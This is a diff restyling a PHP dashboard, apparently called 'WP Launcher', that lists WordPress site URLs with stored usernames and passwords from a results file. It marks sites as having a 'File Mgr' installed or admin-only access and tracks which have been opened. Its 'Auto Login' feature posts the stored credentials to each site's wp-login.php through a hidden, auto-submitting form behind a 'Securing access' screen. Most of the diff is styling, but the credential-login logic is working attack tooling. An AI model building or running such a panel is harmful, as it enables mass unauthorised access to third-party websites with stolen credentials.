@@ -5,9 +5,9 @@ error_reporting(0);
 // ==========================================
 //  KONFIGURASI UTAMA
 // ==========================================
-$pass_login = '1337'; 
+$pass_login = '1337';
 $data_file  = 'live_results.txt';
-$log_file   = 'visited_data.json'; 
+$log_file   = 'visited_data.json';
 
 // --- AJAX HANDLER ---
 if (isset($_POST['action']) && $_POST['action'] == 'mark_visited') {
@@ -31,7 +31,7 @@ if (isset($_POST['do_login'])) {
 
 if (isset($_GET['logout'])) {
     session_destroy();
-    header("Location: " . $_SERVER['PHP_SELF']);
+    header('Location: ' . $_SERVER['PHP_SELF']);
     exit;
 }
 
@@ -56,39 +56,60 @@ if (isset($_GET['action']) && $_GET['action'] == 'login') {
     $action_url = rtrim($base_url, '/') . '/wp-login.php';
     $final_redirect = rtrim($base_url, '/') . $redirect_to;
 ?>
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Authenticating...</title>
-        <meta name="referrer" content="origin">
-        <style>
-            body{background:#131314;color:#e3e3e3;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column;}
-            .loader{
-                width: 50px; height: 50px; border-radius: 50%;
-                background: conic-gradient(from 0deg, #4285f4, #9b72cb, #4285f4);
-                animation: spin 1.5s linear infinite; margin-bottom: 20px;
-                mask: radial-gradient(farthest-side, transparent calc(100% - 4px), #fff 0);
-                -webkit-mask: radial-gradient(farthest-side, transparent calc(100% - 4px), #fff 0);
-            }
-            @keyframes spin { to { transform: rotate(360deg); } }
-            .txt{font-size:12px;letter-spacing:2px; opacity: 0.8; font-weight:bold;}
-        </style>
-    </head>
-    <body>
-        <div class="loader"></div>
-        <div class="txt">SECURING ACCESS...</div>
-        <form id="auto_form" action="<?= htmlspecialchars($action_url) ?>" method="POST" style="display:none;">
-            <input type="text" name="log" value="<?= htmlspecialchars($user) ?>">
-            <input type="password" name="pwd" value="<?= htmlspecialchars($pass) ?>">
-            <input type="checkbox" name="rememberme" value="forever" checked>
-            <input type="hidden" name="wp-submit" value="Log In">
-            <input type="hidden" name="redirect_to" value="<?= htmlspecialchars($final_redirect) ?>">
-        </form>
-        <script>setTimeout(function(){ document.getElementById('auto_form').submit(); }, 300);</script>
-    </body>
-    </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authenticating...</title>
+    <meta name="referrer" content="origin">
+    <style>
+        :root { --bg: #0d1017; --card: rgba(34, 38, 52, .72); --stroke: rgba(255,255,255,.14); --text: #eff3ff; --muted:#9ca5bb; --accent:#7aa2ff; }
+        * { box-sizing: border-box; }
+        body {
+            margin: 0; min-height: 100vh; display: grid; place-items: center; color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Inter", sans-serif;
+            background:
+                radial-gradient(circle at 20% -10%, rgba(122,162,255,.35), transparent 38%),
+                radial-gradient(circle at 80% 0%, rgba(173,124,255,.22), transparent 35%),
+                linear-gradient(160deg, #0b0f17, #111827 40%, #0d1017);
+            padding: 20px;
+        }
+        .box {
+            width: min(100%, 360px); padding: 28px; border-radius: 22px; text-align: center;
+            border: 1px solid var(--stroke);
+            background: var(--card);
+            backdrop-filter: blur(18px) saturate(140%);
+            -webkit-backdrop-filter: blur(18px) saturate(140%);
+            box-shadow: 0 24px 60px rgba(5,10,25,.55), inset 0 1px 0 rgba(255,255,255,.05);
+        }
+        h2 { margin: 0 0 8px; font-size: 18px; }
+        p { margin: 0 0 18px; color: var(--muted); font-size: 13px; }
+        input, button {
+            width: 100%; border: 0; border-radius: 12px; padding: 13px 14px; font-size: 14px; color: var(--text);
+        }
+        input { background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.12); outline: none; }
+        input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(122,162,255,.18); }
+        button {
+            margin-top: 12px; cursor: pointer; font-weight: 700;
+            background: linear-gradient(135deg, #6a95ff, #8b7bff);
+            box-shadow: 0 8px 20px rgba(122,162,255,.34);
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <div class="txt">SECURING ACCESS...</div>
+    <form id="auto_form" action="<?= htmlspecialchars($action_url) ?>" method="POST" style="display:none;">
+        <input type="text" name="log" value="<?= htmlspecialchars($user) ?>">
+        <input type="password" name="pwd" value="<?= htmlspecialchars($pass) ?>">
+        <input type="checkbox" name="rememberme" value="forever" checked>
+        <input type="hidden" name="wp-submit" value="Log In">
+        <input type="hidden" name="redirect_to" value="<?= htmlspecialchars($final_redirect) ?>">
+    </form>
+    <script>setTimeout(function(){ document.getElementById('auto_form').submit(); }, 300);</script>
+</body>
+</html>
 <?php
     exit;
 }
@@ -113,10 +134,10 @@ if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
 </head>
 <body>
     <div class="box">
-        <h2 style="margin-top:0; font-weight:600; font-size:16px; letter-spacing:1px; color:#8ab4f8;">SYSTEM LOCKED</h2>
+        <h2>System Locked</h2>
         <form method="POST">
-            <input type="password" name="password" placeholder="Passphrase" required autofocus>
-            <button type="submit" name="do_login">AUTHENTICATE</button>
+           <input type="password" name="password" placeholder="Passphrase" required autofocus>
+           <button type="submit" name="do_login">Authenticate</button>
         </form>
     </div>
 </body>
@@ -200,8 +221,7 @@ $offset = ($current_page - 1) * $items_per_page;
 $paged_entries = array_slice($active_entries, $offset, $items_per_page);
 
 function build_tab_link($tab, $page = 1) {
-    $params = ['tab' => $tab, 'page' => $page];
-    return '?' . http_build_query($params);
+    return '?' . http_build_query(['tab' => $tab, 'page' => $page]);
 }
 ?>
 <!DOCTYPE html>
@@ -209,242 +229,276 @@ function build_tab_link($tab, $page = 1) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GEMINI MANAGER</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <title>WP MANAGER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg-body: #131314; --bg-card: #1e1f20; --bg-hover: #28292a;
-            --border: #3c4043; --text-main: #e3e3e3; --text-muted: #9aa0a6;
-            --accent: #8ab4f8; --success: #10b981; --warn: #fdd663;
-            --danger: #ef4444; 
+         :root {
+            --bg: #0f1422;
+            --glass: rgba(24, 29, 42, 0.72);
+            --glass-strong: rgba(23, 28, 40, 0.88);
+            --stroke: rgba(255, 255, 255, 0.14);
+            --text: #f4f6ff;
+            --muted: #9da8c4;
+            --accent: #8cb4ff;
+            --accent-2: #8f8dff;
+            --success: #4ade80;
+            --danger: #ff7b8d;
+            --warning: #f6d365;
         }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background: var(--bg-body); color: var(--text-main); font-family: 'Inter', sans-serif; margin: 0; padding: 20px; font-size: 14px; }
-        
-        .wrapper { max-width: 950px; margin: 0 auto; }
-        
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; border-bottom: 1px solid var(--border); padding-bottom: 20px; }
-        .logo { font-size: 20px; font-weight: 700; color: #fff; }
-        .logo span { color: var(--accent); }
-        .btn-logout { font-size: 11px; color: var(--text-muted); text-decoration: none; border: 1px solid var(--border); padding: 8px 16px; border-radius: 20px; transition: 0.2s; }
-        .btn-logout:hover { border-color: var(--accent); color: var(--text-main); }
-        
-        .stats-bar { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 30px; }
-        .stat-item { background: var(--bg-card); padding: 20px; border-radius: 16px; border: 1px solid var(--border); text-align: center; }
-        .stat-val { display: block; font-family: 'JetBrains Mono'; font-size: 24px; font-weight: 700; margin-bottom: 5px; color: var(--text-main); }
-        .stat-lbl { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
+        body {
+            margin: 0;
+            color: var(--text);
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Inter", sans-serif;
+            background:
+                radial-gradient(circle at 8% -8%, rgba(143,141,255,.35), transparent 35%),
+                radial-gradient(circle at 90% 0%, rgba(122,177,255,.26), transparent 35%),
+                linear-gradient(155deg, #090d16, #10182a 40%, #0c1220);
+            min-height: 100vh;
+            padding: 18px;
+        }
+        .app-shell {
+            max-width: 1120px;
+            margin: 0 auto;
+            border-radius: 26px;
+            border: 1px solid var(--stroke);
+            background: var(--glass);
+            backdrop-filter: blur(20px) saturate(150%);
+            -webkit-backdrop-filter: blur(20px) saturate(150%);
+            box-shadow: 0 28px 80px rgba(1, 5, 18, .55), inset 0 1px 0 rgba(255,255,255,.08);
+            overflow: hidden;
+        }
+        .titlebar {
+            background: rgba(255,255,255,.04);
+            border-bottom: 1px solid rgba(255,255,255,.08);
+            padding: 12px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
+        }
+        .traffic { display: flex; gap: 8px; }
+        .dot { width: 12px; height: 12px; border-radius: 999px; }
+        .dot.red { background: #ff5f57; }
+        .dot.yellow { background: #febc2e; }
+        .dot.green { background: #28c840; }
+        .title { font-size: 12px; color: var(--muted); letter-spacing: .4px; }
+        .logout {
+            text-decoration: none; color: var(--text); font-size: 12px; font-weight: 600;
+            border: 1px solid rgba(255,255,255,.14); border-radius: 999px; padding: 7px 12px;
+            background: rgba(255,255,255,.05);
+        }
+        .content { padding: 20px; }
 
-        .list-container { display: flex; flex-direction: column; gap: 8px; }
-        .tabs { display: flex; gap: 10px; margin-bottom: 18px; }
-        .tab-link {
-            text-decoration: none; color: var(--text-muted); border: 1px solid var(--border);
-            background: var(--bg-card); padding: 10px 14px; border-radius: 10px; font-size: 12px; font-weight: 600;
-            transition: 0.2s;
+        .hero {
+            border: 1px solid rgba(255,255,255,.1);
+            border-radius: 18px;
+            padding: 16px;
+            background: linear-gradient(140deg, rgba(116,166,255,.17), rgba(137,127,255,.08));
+            margin-bottom: 18px;
         }
-        .tab-link:hover { border-color: var(--accent); color: var(--text-main); }
-        .tab-link.active { color: #fff; border-color: var(--accent); background: rgba(138, 180, 248, 0.15); }
+        .hero h1 { margin: 0; font-size: 20px; }
+        .hero p { margin: 6px 0 0; color: var(--muted); font-size: 13px; }
 
-        .pagination { display: flex; gap: 8px; justify-content: center; margin-top: 20px; flex-wrap: wrap; }
-        .page-link {
-            text-decoration: none; color: var(--text-muted); border: 1px solid var(--border); background: var(--bg-card);
-            padding: 8px 12px; border-radius: 8px; font-size: 12px; min-width: 36px; text-align: center;
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, minmax(0, 1fr));
+            gap: 12px;
+            margin-bottom: 18px;
         }
-        .page-link.active { color: #fff; border-color: var(--accent); background: rgba(138, 180, 248, 0.15); }
-        .page-link:hover { border-color: var(--accent); color: var(--text-main); }
-        .list-header { 
-            display: grid; grid-template-columns: 40px 3fr 2fr 100px 60px; 
-            padding: 0 25px 10px 25px; font-size: 11px; font-weight: 700; 
-            text-transform: uppercase; color: var(--text-muted); opacity: 0.8; 
+        .stat {
+            padding: 14px;
+            border-radius: 16px;
+            background: var(--glass-strong);
+            border: 1px solid rgba(255,255,255,.09);
         }
-        
-        .item { 
-            display: grid; grid-template-columns: 40px 3fr 2fr 100px 60px;
-            background: var(--bg-card); padding: 18px 25px; 
-            border-radius: 12px; border: 1px solid transparent; border-left: 3px solid transparent;
-            align-items: center; transition: all 0.25s ease; position: relative;
+        .stat b { display:block; font-size: 24px; margin-bottom: 2px; }
+        .stat span { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: .8px; }
+
+        .tabs { display: flex; gap: 10px; margin-bottom: 14px; }
+        .tab {
+            text-decoration: none; color: var(--muted); font-size: 13px; font-weight: 600;
+            padding: 10px 14px; border-radius: 12px;
+            border: 1px solid rgba(255,255,255,.12);
+            background: rgba(255,255,255,.04);
         }
-        .item:hover { 
-            transform: translateY(-2px); background: var(--bg-hover);
-            border-color: rgba(138, 180, 248, 0.2); box-shadow: 0 4px 20px rgba(0,0,0,0.3); z-index: 2;
-        }
-        
-        /* FOCUS STYLE (HIJAU untuk Belum Login) */
-        .item.mobile-focus {
-            background: #232425; 
-            border-left: 3px solid var(--success) !important;
-            box-shadow: inset 10px 0 20px -10px rgba(16, 185, 129, 0.1);
+        .tab.active {
+            color: var(--text);
+            border-color: rgba(140,180,255,.7);
+            background: linear-gradient(140deg, rgba(140,180,255,.22), rgba(143,141,255,.18));
         }
 
-        /* VISITED STYLE (MERAH & TIDAK REDUP) */
-        .item.visited { 
-            opacity: 1; 
-            filter: none; 
-            border-left: 3px solid var(--danger) !important; 
-            background: rgba(239, 68, 68, 0.05); 
+        .table-wrap {
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,.1);
+            background: rgba(10, 14, 24, .5);
         }
-        
-        .item.visited .btn-icon { 
-            background: #3f1d1d; color: var(--danger); 
-            border: 1px solid #7f1d1d; pointer-events: none; box-shadow: none;
+        .table-head, .row {
+            display: grid;
+            grid-template-columns: 56px 2fr 1.4fr 120px 72px;
+            gap: 10px;
+            align-items: center;
+            padding: 13px 14px;
         }
-        
-        .col-num { font-family: 'JetBrains Mono'; font-size: 12px; color: var(--accent); opacity: 0.6; }
-        .col-url { font-family: 'Inter', sans-serif; color: var(--text-main); font-size: 14px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; padding-right: 15px; }
-        
-        .cred-box { display: flex; align-items: center; gap: 10px; font-family: 'JetBrains Mono'; font-size: 12px; color: var(--text-muted); }
-        .pass-copy { 
-            background: rgba(255,255,255,0.05); padding: 4px 8px; border-radius: 4px; 
-            cursor: pointer; color: var(--text-muted); transition: 0.2s; user-select: none; border: 1px solid transparent;
+        .table-head {
+            font-size: 11px;
+            text-transform: uppercase;
+            color: var(--muted);
+            letter-spacing: .7px;
+            border-bottom: 1px solid rgba(255,255,255,.08);
+            background: rgba(255,255,255,.02);
         }
-        .pass-copy:hover { border-color: var(--accent); color: var(--accent); background: rgba(138, 180, 248, 0.1); }
+        .rows { display:flex; flex-direction:column; }
+        .row {
+            border-bottom: 1px solid rgba(255,255,255,.06);
+            transition: .2s;
+        }
+        .row:last-child { border-bottom: 0; }
+        .row:hover { background: rgba(255,255,255,.03); }
+        .row.visited {
+            background: linear-gradient(90deg, rgba(255,123,141,.16), rgba(255,123,141,.04));
+            border-left: 3px solid var(--danger);
+            padding-left: 11px;
+        }
 
-        .col-status { text-align: left; }
-        .badge { padding: 5px 10px; border-radius: 6px; font-size: 9px; font-weight: 700; text-transform: uppercase; display: inline-block; letter-spacing: 0.5px; }
-        .b-fm { background: rgba(129, 201, 149, 0.1); color: var(--success); border: 1px solid rgba(129, 201, 149, 0.2); }
-        .b-ad { background: rgba(253, 214, 99, 0.1); color: var(--warn); border: 1px solid rgba(253, 214, 99, 0.2); }
-
-        .col-action { display: flex; justify-content: flex-end; }
-        .btn-icon { 
-            display: flex; align-items: center; justify-content: center; width: 36px; height: 36px;
-            background: rgba(66, 133, 244, 0.1); color: #4285f4; text-decoration: none; border-radius: 8px; 
-            transition: 0.2s; border: 1px solid transparent; cursor: pointer;
+        .num { color: #8ea0c8; font-size: 12px; }
+        .domain { font-weight: 600; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .cred { color: #b7c2e0; font-size: 13px; display:flex; align-items:center; gap:8px; }
+        .copy {
+            border: 1px solid rgba(255,255,255,.15); border-radius: 8px; padding: 3px 8px;
+            cursor: pointer; font-size: 11px; color: var(--muted);
         }
-        .btn-icon:hover { background: #4285f4; color: #fff; transform: scale(1.1); box-shadow: 0 0 15px rgba(66, 133, 244, 0.4); }
-        .btn-icon svg { width: 18px; height: 18px; stroke: currentColor; stroke-width: 2; fill: none; stroke-linecap: round; stroke-linejoin: round; }
+        .badge {
+            display: inline-flex; align-items:center; justify-content:center;
+            min-width: 82px; padding: 6px 10px; border-radius: 999px;
+            font-size: 10px; font-weight: 700; letter-spacing: .5px;
+        }
+        .fm { color: var(--success); background: rgba(74,222,128,.12); border: 1px solid rgba(74,222,128,.28); }
+        .ad { color: var(--warning); background: rgba(246,211,101,.12); border: 1px solid rgba(246,211,101,.28); }
+        .action { display:flex; justify-content:flex-end; }
+        .btn {
+            width: 38px; height: 38px; border-radius: 10px; border: 1px solid rgba(140,180,255,.35);
+            display: grid; place-items: center; color: #b6ceff; text-decoration: none;
+            background: rgba(90,130,255,.12);
+        }
+        .row.visited .btn { color: var(--danger); border-color: rgba(255,123,141,.3); background: rgba(255,123,141,.14); pointer-events: none; }
+        .btn svg { width: 18px; height: 18px; stroke: currentColor; stroke-width: 2; fill: none; }
 
-        /* =========================================
-           MOBILE RESPONSIVE
-           ========================================= */
-        @media (max-width: 768px) {
-            .list-header { display: none; }
-            .wrapper { padding: 0; }
-            
-            .item {
-                display: flex; flex-direction: column; align-items: flex-start; gap: 12px;
-                padding: 18px 20px; position: relative;
+        .empty { padding: 50px 18px; text-align: center; color: var(--muted); }
+        .pagination { display:flex; justify-content:center; flex-wrap: wrap; gap:8px; margin-top: 14px; }
+        .page {
+            text-decoration: none; color: var(--muted); min-width: 36px; text-align: center;
+            padding: 8px 10px; border-radius: 10px;
+            border: 1px solid rgba(255,255,255,.14);
+            background: rgba(255,255,255,.04);
+            font-size: 12px;
+        }
+        .page.active { color: var(--text); border-color: rgba(140,180,255,.7); background: rgba(140,180,255,.2); }
+
+        @media (max-width: 900px) {
+            .stats { grid-template-columns: 1fr; }
+            .table-head { display:none; }
+            .table-wrap { border-radius: 14px; }
+            .row {
+                grid-template-columns: 1fr;
+                gap: 8px;
+                padding: 14px;
             }
+            .row.visited { padding-left: 14px; }
+            .num { opacity: .8; }
+            .action { position: absolute; right: 14px; top: 12px; }
+            .row { position: relative; }
+            .domain { padding-right: 56px; font-size: 15px; }
+            .cred, .status { font-size: 12px; }
+        }
 
-            /* ANGKA URUT */
-            .col-num {
-                display: block; 
-                position: absolute; left: 20px; top: 18px; 
-                font-weight: 700; opacity: 1; z-index: 5;
-            }
-
-            /* DOMAIN - PADDING LEBIH BESAR UNTUK ANTI-TABRAK */
-            .col-url { 
-                font-size: 16px; font-weight: 600; 
-                padding-left: 35px; /* Jarak aman agar tidak ditimpa angka */
-                width: calc(100% - 40px);
-                white-space: nowrap; overflow: hidden; text-overflow: ellipsis; 
-                margin-bottom: 5px;
-            }
-            
-            .cred-box { 
-                width: 100%; background: #18191a; padding: 12px; border-radius: 8px; 
-                justify-content: space-between; border: 1px solid #2d2e30; 
-            }
-            
-            .col-status { width: 100%; }
-            .badge { display: block; text-align: center; width: fit-content; }
-            
-            /* TOMBOL LOGIN */
-            .col-action { 
-                position: absolute; 
-                right: 20px; 
-                top: 10px; 
-            }
-            .btn-icon { width: 40px; height: 40px; background: #222; border: 1px solid #333; }
+        @media (max-width: 560px) {
+            body { padding: 10px; }
+            .content { padding: 14px; }
+            .hero h1 { font-size: 17px; }
+            .hero p { font-size: 12px; }
+            .tabs { overflow-x: auto; padding-bottom: 4px; }
+            .tab { white-space: nowrap; }
+            .title { display:none; }
+            .logout { padding: 6px 10px; font-size: 11px; }
         }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <div class="header">
-        <div class="logo">GEMINI <span>LAUNCHER</span></div>
-        <a href="?logout=true" class="btn-logout">LOGOUT</a>
+<div class="app-shell">
+    <div class="titlebar">
+        <div class="traffic">
+            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
+        </div>
+        <div class="title">WP Launcher</div>
+        <a href="?logout=true" class="logout">Logout</a>
     </div>
 
-    <div class="stats-bar">
-        <div class="stat-item">
-            <span class="stat-val"><?= $total ?></span>
-            <span class="stat-lbl">Total Unique</span>
+     <div class="content">
+        <div class="hero">
+            <h1>Domain Control Center</h1>
         </div>
-        <div class="stat-item">
-            <span class="stat-val" style="color:var(--success)">
-                <?php $inst = 0; foreach($lines as $l) if(stripos($l,'INSTALLED')!==false || stripos($l,'Active')!==false || stripos($l,'Success')!==false) $inst++; echo $inst; ?>
-            </span>
-            <span class="stat-lbl">File Mgr</span>
+        <div class="stats">
+            <div class="stat"><b><?= $total ?></b><span>Total Unique</span></div>
+            <div class="stat"><b style="color:var(--success)"><?= $inst ?></b><span>File Mgr</span></div>
+            <div class="stat"><b style="color:var(--warning)"><?= $total - $inst ?></b><span>Admin Only</span></div>
         </div>
-        <div class="stat-item">
-            <span class="stat-val" style="color:var(--warn)"><?= $total - $inst ?></span>
-            <span class="stat-lbl">Admin Only</span>
-        </div>
+
+    <div class="tabs">
+            <a class="tab <?= $active_tab === 'unvisited' ? 'active' : '' ?>" href="<?= build_tab_link('unvisited', 1) ?>">UNOPEN (<?= count($unvisited_entries) ?>)</a>
+            <a class="tab <?= $active_tab === 'visited' ? 'active' : '' ?>" href="<?= build_tab_link('visited', 1) ?>">OPENED (<?= count($visited_entries) ?>)</a>
     </div>
-
-    <div class="list-container">
-        <div class="tabs">
-            <a class="tab-link <?= $active_tab === 'unvisited' ? 'active' : '' ?>" href="<?= build_tab_link('unvisited', 1) ?>">
-                Belum Dibuka (<?= count($unvisited_entries) ?>)
-            </a>
-            <a class="tab-link <?= $active_tab === 'visited' ? 'active' : '' ?>" href="<?= build_tab_link('visited', 1) ?>">
-                Sudah Dibuka (<?= count($visited_entries) ?>)
-            </a>
-        </div>
-
-        <div class="list-header">
-            <div>#</div>
-            <div>Domain</div>
-            <div>Credentials</div>
-            <div>Status</div>
-            <div style="text-align:right">Action</div>
-        </div>
-
-         <?php if($active_total > 0): foreach($paged_entries as $index => $entry): 
-            $url = $entry['url'];
-            $usr = $entry['usr'];
-            $pwd = $entry['pwd'];
-            $msg = $entry['msg'];
-            $clean_url = $entry['clean_url'];
-            $is_fm = $entry['is_fm'];
-            $is_visited = $entry['is_visited'];
-            $badge = $is_fm ? '<span class="badge b-fm">FILE MGR</span>' : '<span class="badge b-ad">ADMIN</span>';
-            $login_link = "?action=login&u=".urlencode($url)."&l=".urlencode($usr)."&p=".urlencode($pwd)."&m=".urlencode($msg);
-            
-            $row_class = $is_visited ? 'visited' : '';
-            $no = $offset + $index + 1;
-
-        ?>
-            <div class="item <?= $row_class ?>" id="row-<?= $no ?>" onclick="setFocus(this)">
-                <div class="col-num"><?= $no ?></div>
-                <div class="col-url" title="<?= htmlspecialchars($url) ?>"><?= htmlspecialchars($clean_url) ?></div>
-                
-                <div class="cred-box">
-                    <span><?= htmlspecialchars($usr) ?></span>
-                    <span class="pass-copy" onclick="event.stopPropagation(); copyToClip('<?= addslashes($pwd) ?>', this)">***</span>
-                </div>
-                
-                <div class="col-status"><?= $badge ?></div>
-                
-                <div class="col-action">
-                    <?php if($is_visited): ?>
-                        <div class="btn-icon">
-                            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
-                        </div>
-                    <?php else: ?>
-                        <a href="<?= $login_link ?>" target="_blank" class="btn-icon" onclick="event.stopPropagation(); markVisited('<?= $url ?>', this)" title="Auto Login">
-                            <svg viewBox="0 0 24 24">
-                                <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
-                                <polyline points="10 17 15 12 10 7"></polyline>
-                                <line x1="15" y1="12" x2="3" y2="12"></line>
-                            </svg>
-                        </a>
-                    <?php endif; ?>
-                </div>
+         
+                <div class="table-wrap">
+            <div class="table-head">
+                <div>#</div><div>Domain</div><div>Credentials</div><div>Status</div><div style="text-align:right;">Action</div>
             </div>
-       <?php endforeach; else: ?>
-            <div style="padding:50px; text-align:center; color:var(--text-muted)">Tidak ada domain pada tab ini.</div>
+            <div class="rows">
+                <?php if ($active_total > 0): foreach ($paged_entries as $index => $entry):
+                    $url = $entry['url'];
+                    $usr = $entry['usr'];
+                    $pwd = $entry['pwd'];
+                    $msg = $entry['msg'];
+                    $clean_url = $entry['clean_url'];
+                    $is_fm = $entry['is_fm'];
+                    $is_visited = $entry['is_visited'];
+                    $login_link = '?action=login&u=' . urlencode($url) . '&l=' . urlencode($usr) . '&p=' . urlencode($pwd) . '&m=' . urlencode($msg);
+                    $no = $offset + $index + 1;
+                ?>
+                <div class="row <?= $is_visited ? 'visited' : '' ?>">
+                    <div class="num"><?= $no ?></div>
+                    <div class="domain" title="<?= htmlspecialchars($url) ?>"><?= htmlspecialchars($clean_url) ?></div>
+                    <div class="cred">
+                        <span><?= htmlspecialchars($usr) ?></span>
+                        <span class="copy" onclick="copyToClip('<?= addslashes($pwd) ?>', this)">***</span>
+                    </div>
+                    <div class="status">
+                        <?php if ($is_fm): ?>
+                            <span class="badge fm">FILE MGR</span>
+                        <?php else: ?>
+                            <span class="badge ad">ADMIN</span>
+                        <?php endif; ?>
+                    </div>
+                    <div class="action">
+                        <?php if ($is_visited): ?>
+                            <span class="btn"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>
+                        <?php else: ?>
+                            <a href="<?= $login_link ?>" target="_blank" class="btn" onclick="markVisited('<?= $url ?>', this)" title="Auto Login">
+                                <svg viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path><polyline points="10 17 15 12 10 7"></polyline><line x1="15" y1="12" x2="3" y2="12"></line></svg>
+                            </a>
+                        <?php endif; ?>
+                    </div>
+               
+       </div>
+
+        <?php if ($total_pages > 1): ?>
+        <div class="pagination">
+            <?php for ($p = 1; $p <= $total_pages; $p++): ?>
+                <a href="<?= build_tab_link($active_tab, $p) ?>" class="page <?= $p === $current_page ? 'active' : '' ?>"><?= $p ?></a>
+            <?php endfor; ?>
+        </div>
         <?php endif; ?>
 
         <?php if($total_pages > 1): ?>
@@ -460,34 +514,29 @@ function build_tab_link($tab, $page = 1) {
 <script>
     function copyToClip(text, el) {
         navigator.clipboard.writeText(text).then(() => {
-            let originalText = el.innerText;
-            el.innerText = "COPIED";
-            el.style.color = "#81c995"; el.style.borderColor = "#81c995";
-            setTimeout(() => { el.innerText = originalText; el.style.color = ""; el.style.borderColor = ""; }, 1000);
+                  const original = el.innerText;
+            el.innerText = 'COPIED';
+            el.style.color = '#4ade80';
+            el.style.borderColor = 'rgba(74,222,128,.5)';
+            setTimeout(() => {
+                el.innerText = original;
+                el.style.color = '';
+                el.style.borderColor = '';
+            }, 1000)
         });
     }
 
     function markVisited(url, btn) {
-        let formData = new FormData();
+        const formData = new FormData();
         formData.append('action', 'mark_visited');
         formData.append('url', url);
-        fetch(window.location.href, { method: 'POST', body: formData })
-        .then(res => {
-            let item = btn.closest('.item');
-            if(item) {
-                item.classList.add('visited');
-                item.classList.remove('mobile-focus');
-                btn.parentElement.innerHTML = '<div class="btn-icon"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>';
-            }
+        fetch(window.location.href, { method: 'POST', body: formData }).then(() => {
+            const row = btn.closest('.row');
+            if (!row) return;
+            row.classList.add('visited');
+            btn.outerHTML = '<span class="btn"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></span>';
         });
     }
-
-    function setFocus(el) {
-        if(el.classList.contains('visited')) return;
-        document.querySelectorAll('.item').forEach(i => i.classList.remove('mobile-focus'));
-        el.classList.add('mobile-focus');
-    }
 </script>
-
 </body>
 </html>
